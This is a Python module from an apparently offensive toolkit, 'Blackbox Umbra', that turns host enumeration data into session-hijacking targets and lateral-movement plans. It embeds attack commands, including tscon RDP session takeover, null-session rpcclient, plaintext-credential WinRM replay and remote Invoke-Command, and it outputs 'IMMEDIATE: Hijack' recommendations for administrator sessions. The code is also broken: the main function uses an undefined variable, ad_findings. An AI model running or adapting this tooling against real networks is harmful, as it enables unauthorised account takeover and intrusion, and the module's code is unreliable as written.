#!/usr/bin/env python3
"""
Lateral Movement & Session Hijacking Intelligence Module for Blackbox Umbra
Tracks active sessions, identifies hijacking opportunities, and maps lateral movement vectors
"""

import json
import logging
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


class SessionType(Enum):
    """Types of interactive sessions."""
    RDP = "Remote Desktop Protocol"
    WINRM = "Windows Remote Management"
    SSH = "Secure Shell"
    PSEXEC = "PsExec/SMB"
    WMIEXEC = "WMI Exec"
    SMBEXEC = "SMB Exec"


class Session:
    """Represents an active or historical session."""
    
    def __init__(self, session_id: str, session_type: SessionType, 
                 source: str, destination: str, user: str, 
                 start_time: str, status: str = "active"):
        self.session_id = session_id
        self.session_type = session_type
        self.source = source
        self.destination = destination
        self.user = user
        self.start_time = start_time
        self.status = status  # active, disconnected, stale
        self.privileges = []
        self.process_list = []
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "type": self.session_type.value,
            "source": self.source,
            "destination": self.destination,
            "user": self.user,
            "start_time": self.start_time,
            "status": self.status,
            "privileges": self.privileges,
            "processes": self.process_list
        }


class HijackTarget:
    """Represents a potential session hijacking target."""
    
    def __init__(self, session: Session, hijack_method: str, 
                 severity: str = "HIGH", ease_of_exploitation: str = "MEDIUM"):
        self.session = session
        self.hijack_method = hijack_method
        self.severity = severity
        self.ease_of_exploitation = ease_of_exploitation
        self.commands = []
        self.prerequisites = []
    
    def to_dict(self) -> Dict:
        return {
            "session": self.session.to_dict(),
            "hijack_method": self.hijack_method,
            "severity": self.severity,
            "ease_of_exploitation": self.ease_of_exploitation,
            "commands": self.commands,
            "prerequisites": self.prerequisites
        }


class LateralMovementAnalyzer:
    """
    Analyzes lateral movement opportunities from network data and session information.
    Identifies active sessions, hijacking targets, and movement vectors.
    """
    
    # RDP hijacking methods
    RDP_HIJACK_METHODS = {
        "tscon.exe": {
            "description": "Shadow existing RDP session without notification",
            "severity": "CRITICAL",
            "commands": [
                "query session /server:TARGET",
                r"tscon 1 /dest:console /server:TARGET"  # Hijack session 1
            ],
            "prerequisites": ["SYSTEM privileges", "Same network segment"],
            "tool": "tscon.exe (built-in)"
        },
        "RPC Session Enumeration": {
            "description": "Enumerate RDP sessions via RPC on port 135/445",
            "severity": "HIGH",
            "commands": [
                "rpcclient -U% -N TARGET",
                "wmic /node:TARGET process list"
            ],
            "prerequisites": ["Network connectivity", "Admin credentials optional"],
            "tool": "rpcclient, wmic"
        }
    }
    
    # WinRM hijacking methods
    WINRM_HIJACK_METHODS = {
        "Enter-PSSession": {
            "description": "Kerberos/NTLM credential replay via WinRM",
            "severity": "HIGH",
            "commands": [
                "$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\user', (ConvertTo-SecureString 'password' -AsPlainText -Force))",
                "Enter-PSSession -ComputerName TARGET -Credential $cred"
            ],
            "prerequisites": ["Valid credentials", "WinRM enabled (port 5985/5986)"],
            "tool": "PowerShell (built-in)"
        },
        "Invoke-Command": {
            "description": "Execute commands on remote system via WinRM",
            "severity": "HIGH",
            "commands": [
                "Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }"
            ],
            "prerequisites": ["Valid credentials", "WinRM enabled"],
            "tool": "PowerShell (built-in)"
        }
    }
    
    def __init__(self):
        self.sessions: List[Session] = []
        self.hijack_targets: List[HijackTarget] = []
        self.lateral_paths: List[Dict] = []
    
    def analyze_rdp_sessions(self, host: str, rdp_data: Dict) -> List[HijackTarget]:
        """
        Analyze RDP sessions for hijacking opportunities.
        
        Args:
            host: Target hostname/IP
            rdp_data: RDP session information from enum.py
        
        Returns:
            List of hijack targets
        """
        targets = []
        
        active_sessions = rdp_data.get('active_sessions', [])
        for sess_info in active_sessions:
            session_id = sess_info.get('session_id')
            user = sess_info.get('user', 'UNKNOWN')
            session_time = sess_info.get('session_time', 'UNKNOWN')
            
            # Create session object
            session = Session(
                session_id=session_id,
                session_type=SessionType.RDP,
                source=sess_info.get('source_ip', 'UNKNOWN'),
                destination=host,
                user=user,
                start_time=session_time,
                status="active" if sess_info.get('state') == 'ACTIVE' else "disconnected"
            )
            
            # Determine admin status
            if user and any(x in user.lower() for x in ['admin', 'system', 'da', 'domain admin']):
                session.privileges.append("Administrator")
                
                # High-value target for hijacking
                for method_name, method_info in self.RDP_HIJACK_METHODS.items():
                    target = HijackTarget(
                        session=session,
                        hijack_method=method_name,
                        severity="CRITICAL",
                        ease_of_exploitation="MEDIUM"
                    )
                    target.commands = method_info.get('commands', [])
                    target.prerequisites = method_info.get('prerequisites', [])
                    targets.append(target)
            else:
                # Even non-admin sessions valuable for lateral movement
                target = HijackTarget(
                    session=session,
                    hijack_method="tscon.exe",
                    severity="HIGH",
                    ease_of_exploitation="MEDIUM"
                )
                target.commands = self.RDP_HIJACK_METHODS['tscon.exe']['commands']
                targets.append(target)
            
            self.sessions.append(session)
        
        logger.info(f"Analyzed {len(active_sessions)} RDP sessions on {host}")
        return targets
    
    def analyze_winrm_targets(self, hosts: List[str], enum_data: Dict) -> List[HijackTarget]:
        """
        Analyze WinRM-enabled hosts for hijacking opportunities.
        
        Args:
            hosts: List of target hostnames/IPs
            enum_data: Enumeration data including WinRM detection
        
        Returns:
            List of hijack targets
        """
        targets = []
        
        for host in hosts:
            # Check if WinRM is enabled
            if enum_data.get('winrm_enabled', False):
                session = Session(
                    session_id=f"WINRM-{host}",
                    session_type=SessionType.WINRM,
                    source="attacker",
                    destination=host,
                    user="authenticated_user",
                    start_time=datetime.now().isoformat(),
                    status="available"
                )
                
                # All WinRM methods
                for method_name, method_info in self.WINRM_HIJACK_METHODS.items():
                    target = HijackTarget(
                        session=session,
                        hijack_method=method_name,
                        severity="HIGH",
                        ease_of_exploitation="LOW"
                    )
                    target.commands = method_info.get('commands', [])
                    target.prerequisites = method_info.get('prerequisites', [])
                    targets.append(target)
                
                self.sessions.append(session)
        
        logger.info(f"Identified {len(targets)} WinRM exploitation vectors")
        return targets
    
    def detect_stale_sessions(self, sessions: List[Dict], stale_threshold_hours: int = 24) -> List[Dict]:
        """
        Detect stale/disconnected sessions that may allow hijacking.
        
        Args:
            sessions: List of session data
            stale_threshold_hours: Sessions older than this are "stale"
        
        Returns:
            List of stale sessions
        """
        stale = []
        
        for session_data in sessions:
            last_activity = session_data.get('last_activity')
            if last_activity:
                # Parse timestamp and check age
                try:
                    activity_time = datetime.fromisoformat(last_activity)
                    age_hours = (datetime.now() - activity_time).total_seconds() / 3600
                    
                    if age_hours > stale_threshold_hours:
                        stale.append({
                            "session_id": session_data.get('session_id'),
                            "user": session_data.get('user'),
                            "age_hours": age_hours,
                            "risk": "Token/ticket may still be valid for replay"
                        })
                except:
                    pass
        
        logger.info(f"Found {len(stale)} stale sessions eligible for token replay")
        return stale
    
    def map_lateral_paths(self, hosts: Dict, admin_users: List[str]) -> List[Dict]:
        """
        Map lateral movement paths using compromised sessions.
        
        Args:
            hosts: Host data from recon (IP → host info)
            admin_users: Known admin/service accounts
        
        Returns:
            List of lateral movement paths
        """
        paths = []
        
        for hijack_target in self.hijack_targets:
            session = hijack_target.session
            source_user = session.user
            dest_host = session.destination
            
            # Find where this user can move next
            for other_host, host_info in hosts.items():
                if other_host == dest_host:
                    continue
                
                # Check if user likely has access to other hosts
                os_type = host_info.get('os', 'UNKNOWN')
                
                path = {
                    "from": (source_user, session.source),
                    "to": (dest_host, other_host),
                    "method": session.session_type.value,
                    "hijack_via": hijack_target.hijack_method,
                    "os": os_type,
                    "steps": self._build_movement_steps(session, source_user, dest_host, other_host)
                }
                paths.append(path)
        
        self.lateral_paths = paths
        logger.info(f"Mapped {len(paths)} potential lateral movement paths")
        return paths
    
    def _build_movement_steps(self, session: Session, user: str, 
                             current_host: str, target_host: str) -> List[str]:
        """Build step-by-step exploitation instructions."""
        steps = [
            f"1. Compromise {current_host} (via {session.session_type.value})",
            f"2. Extract credentials for {user}",
            f"3. Use credentials to move laterally to {target_host}",
            f"4. Establish new session on {target_host}",
            f"5. Repeat for further propagation"
        ]
        return steps
    
    def get_hijack_recommendations(self) -> Dict:
        """Generate tactical hijacking recommendations."""
        recs = {
            "immediate_actions": [],
            "tools": set(),
            "prerequisites": set()
        }
        
        for target in self.hijack_targets:
            if target.severity == "CRITICAL":
                recs["immediate_actions"].append(
                    f"IMMEDIATE: Hijack {target.session.user} session on {target.session.destination} "
                    f"via {target.hijack_method}"
                )
            
            # Collect tools
            if target.session.session_type == SessionType.RDP:
                recs["tools"].add("tscon.exe")
                recs["tools"].add("rpcclient")
            elif target.session.session_type == SessionType.WINRM:
                recs["tools"].add("PowerShell")
                recs["tools"].add("evil-winrm")
        
        return {
            "immediate_actions": recs["immediate_actions"],
            "tools": list(recs["tools"]),
            "prerequisites": list(recs["prerequisites"])
        }


def run_lateral_movement_analysis(hosts: Dict) -> Dict:
    """
    Main entry point for lateral movement analysis phase.
    
    Args:
        hosts: Host discovery data with enumeration findings
    
    Returns:
        Dict containing lateral movement analysis
    """
    results = {
        "phase": "lateral_movement",
        "status": "completed",
        "timestamp": datetime.now().isoformat(),
        "sessions": [],
        "hijack_targets": [],
        "lateral_paths": [],
        "recommendations": {},
        "notes": []
    }
    
    try:
        analyzer = LateralMovementAnalyzer()
        
        # Analyze each host for RDP/WinRM sessions
        total_hijack_targets = 0
        for host_ip, host_data in hosts.items():
            if host_data.get('status') != 'up':
                continue
            
            # Check for RDP sessions
            rdp_data = host_data.get('enum', {}).get('rdp', {})
            if rdp_data:
                rdp_targets = analyzer.analyze_rdp_sessions(host_ip, rdp_data)
                analyzer.hijack_targets.extend(rdp_targets)
                total_hijack_targets += len(rdp_targets)
            
            # Check for WinRM
            winrm_data = host_data.get('enum', {}).get('winrm', {})
            if winrm_data and winrm_data.get('available'):
                winrm_targets = analyzer.analyze_winrm_targets([host_ip], winrm_data)
                analyzer.hijack_targets.extend(winrm_targets)
                total_hijack_targets += len(winrm_targets)
        
        results["sessions"] = [s.to_dict() for s in analyzer.sessions]
        results["hijack_targets"] = [t.to_dict() for t in analyzer.hijack_targets]
        
        # Map lateral movement paths
        if analyzer.sessions:
            lateral_paths = analyzer.map_lateral_paths(hosts, 
                                                       ad_findings.get('users', {}) if ad_findings else {})
            results["lateral_paths"] = lateral_paths
        
        # Generate recommendations
        if analyzer.hijack_targets:
            results["recommendations"] = analyzer.get_hijack_recommendations()
        
        results["notes"].append(
            f"Identified {len(analyzer.sessions)} active sessions, "
            f"{total_hijack_targets} hijack targets, "
            f"{len(results['lateral_paths'])} lateral movement paths"
        )
        
        if total_hijack_targets:
            results["status"] = "success"
        else:
            results["status"] = "warning"
            results["notes"].append("⚠️  No obvious hijacking targets identified")
    
    except Exception as e:
        logger.error(f"Lateral movement analysis failed: {e}")
        results["status"] = "error"
        results["notes"].append(f"Error: {str(e)}")
    
    return results
